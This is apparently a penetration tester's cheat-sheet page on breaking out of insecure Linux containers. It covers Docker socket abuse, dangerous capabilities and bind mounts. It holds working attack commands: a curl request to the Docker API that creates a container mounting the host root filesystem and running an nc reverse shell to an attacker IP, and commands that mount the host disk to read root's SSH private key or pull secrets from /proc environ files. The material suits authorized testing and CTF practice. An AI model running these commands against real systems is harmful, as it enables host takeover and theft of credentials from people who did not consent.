---
title: Linux Container Escape
---

Break out of insecure containers on [[notes/linux/index]].
Don't forget to check [[notes/linux/credential-access-user]] and [[notes/linux/escalation-kernel-exploits]].

Untested tools:

- [deepce](https://github.com/stealthcopter/deepce)

# Sockets

Sockets, e.g. for the Docker API, mounted into the container.

~~~ bash
ls -ld /{run,var/run}/{crio/crio,docker,dockershim,containerd/containerd,frakti,rktlet}.sock
find / -type s -ls 2> /dev/null
~~~

## Docker Socket Exploitation

List available images.

~~~
❯ curl -i -s --unix-socket /var/run/docker.sock http://localhost/images/json
[
  {
    "Containers": -1,
    "Created": 1590787186,
    "Id": "sha256:a24bb4013296f61e89ba57005a7b3e52274d8edd3ae2077d04395f806b63d83e",
    "Labels": null,
    "ParentId": "",
    "RepoDigests": null,
    "RepoTags": [
      "sandbox:latest"
    ],
    "SharedSize": -1,
    "Size": 5574537,
    "VirtualSize": 5574537
  },
  ...
]
~~~

Create a new container.

~~~
❯ curl -i -s --unix-socket /var/run/docker.sock -X POST -H 'Content-Type: application/json' -d @- http://localhost/containers/create << EOF
{
  "Image": "sandbox:latest",
  "Cmd": ["/bin/sh","-c","rm -f /tmp/s && mkfifo /tmp/s && cat /tmp/s | /bin/sh -i 2>&1 | nc 10.10.14.53 1332 > /tmp/s"],
  "DetachKeys": "Ctrl-p,Ctrl-q",
  "OpenStdin": true,
  "Mounts": [
    {
      "Type": "bind",
      "Source": "/",
      "Target": "/rootfs"
    }
  ]
}
EOF
{"Id":"461afb04cbc88e9a18b61f45e877648ef2dbd6dc3ad94505c2f403030516c227","Warnings":[]}
~~~

Start the container.

~~~
❯ curl -i -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/461afb04cbc88e9a18b61f45e877648ef2dbd6dc3ad94505c2f403030516c227/start
~~~

References:

- [Escaping the Whale: Things you probably shouldn't do with Docker (Part 1)](https://web.archive.org/web/20220528052412/https://www.secureideas.com/blog/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1.html)

# Capabilities

Dangerous capabilities like `CAP_SYS_ADMIN`.

~~~ bash
grep Cap /proc/self/status
~~~

Decode the output with `capsh --decode=00000000a80425fb`.

References:

- [HTB: CyberMonday](http://web.archive.org/web/20231203124118/https://0xdf.gitlab.io/2023/12/02/htb-cybermonday.html) and [Docker breakout exploit analysis](http://web.archive.org/web/20231203124020/https://scribe.rip/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), exploitation of `CAP_DAC_READ_SEARCH`
- [7 Ways to Escape a Container](http://web.archive.org/web/20230905200448/https://www.panoptica.app/research/7-ways-to-escape-a-container), exploitation of `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_DAC_READ_SEARCH` and `CAP_DAC_OVERRIDE` capabilities

# Bind Mounts

Direct access to storage devices.

~~~ bash
mount | grep -e /dev/
ls -la /dev
~~~

This can be exploited by mounting the host rootfs.

~~~ bash
mount /dev/sda1 /mnt
cat /mnt/root/.ssh/id_rsa
~~~

If `mount` shows `proc on /proc type proc`, then `/proc` was bind-mounted into the container.
You can access the host rootfs trough `/proc/*/root/etc/passwd`.
Additionally you might be able to extract secrets from the host trough `/proc/*/cmdline` and `/proc/*/environ`.
